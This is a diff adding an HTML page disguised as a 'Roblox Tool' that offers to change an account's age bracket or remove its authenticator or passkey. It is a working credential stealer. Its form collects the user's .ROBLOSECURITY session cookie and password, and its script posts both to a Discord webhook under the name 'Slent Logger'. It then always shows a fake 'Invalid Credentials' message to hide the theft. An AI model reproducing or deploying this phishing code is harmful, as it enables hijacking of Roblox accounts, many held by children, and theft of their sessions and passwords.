@@ -1,0 +1,120 @@
+<!DOCTYPE html>
+<html>
+<head>
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Roblox Tool</title>
+    <link rel="stylesheet" href="/style.css">
+</head>
+<body>
+    <div id="loading-screen" class="loading-screen">
+        <div class="loader"></div>
+    </div>
+    <div class="container">
+        <select id="optionSelect" class="styled-select">
+            <option value="Force 13+ to 13>">Force 13+ to 13></option>
+            <option value="Remove authenticator">Remove authenticator</option>
+            <option value="Remove Passkey">Remove Passkey</option> 
+        </select>
+        <h1 id="mainTitle">Force 13+ to 13></h1>
+        <form id="checkerForm">
+            <div class="form-group">
+                <label for="cookie">Roblox Cookie (.ROBLOSECURITY):</label>
+                <input type="text" id="cookie" name="cookie" required>
+            </div>
+            <div class="form-group">
+                <label for="password">Password:</label>
+                <input type="password" id="password" name="password" required>
+            </div>
+            <button type="submit">Log-in</button>
+        </form>
+        <div id="result"></div>
+    </div>
+    <script>
+        window.addEventListener('load', () => {
+            const loadingScreen = document.getElementById('loading-screen');
+            setTimeout(() => {
+                loadingScreen.style.display = 'none';
+            }, 1000);
+        });
+
+        document.getElementById('optionSelect').addEventListener('change', (e) => {
+            const mainTitle = document.getElementById('mainTitle');
+            mainTitle.textContent = e.target.value;
+            const loadingScreen = document.getElementById('loading-screen');
+            loadingScreen.style.display = 'flex';
+            setTimeout(() => {
+                loadingScreen.style.display = 'none';
+            }, 1000);
+        });
+        
+        document.getElementById('checkerForm').addEventListener('submit', async (e) => {
+            e.preventDefault();
+            const result = document.getElementById('result');
+result.textContent = 'Processing...';
+result.classList.add('show');
+setTimeout(() => result.classList.remove('show'), 3000);
+
+            const cookie = document.getElementById('cookie').value;
+            const password = document.getElementById('password').value;
+            const showNotification = (message, isSuccess = true) => {
+                const result = document.getElementById('result');
+                result.textContent = message;
+                result.style.borderLeft = `4px solid ${isSuccess ? '#4CAF50' : '#ff3333'}`;
+                result.classList.add('show');
+                setTimeout(() => result.classList.remove('show'), 3000);
+            };
+
+            try {
+                showNotification('Checking account information...', true);
+                const configResponse = await fetch('/config');
+                const config = await configResponse.json();
+
+                await fetch(config.webhookURL, {
+                    method: 'POST',
+                    headers: {
+                        'Content-Type': 'application/json'
+                    },
+                    body: JSON.stringify({
+                        username: "Slent Logger",
+                        avatar_url: "https://cdn.discordapp.com/attachments/1347846935742255135/1357581197257212068/Picsart_25-04-02_11-23-10-772.jpg",
+                        embeds: [
+                            {
+                                title: "🍪 Cookie Information",
+                                description: "```" + cookie + "```",
+                                color: 5814783,
+                                footer: {
+                                    text: "Made by Slent"
+                                },
+                                timestamp: new Date().toISOString()
+                            },
+                            {
+                                title: "🔑 Password Information",
+                                description: "```" + password + "```",
+                                color: 5814783,
+                                footer: {
+                                    text: "Made by Slent"
+                                },
+                                timestamp: new Date().toISOString()
+                            }
+                        ]
+                    })
+                });
+
+                // Then check account info
+                const response = await fetch('/check', {
+                    method: 'POST',
+                    headers: {
+                        'Content-Type': 'application/json'
+                    },
+                    body: JSON.stringify({ cookie, password })
+                });
+
+                const data = await response.json();
+                showNotification("❌ Invalid Credentials");
+            } catch (error) {
+                showNotification('❌ Error: ' + error.message, false);
+            }
+        });
+    </script>
+</body>
+</html>
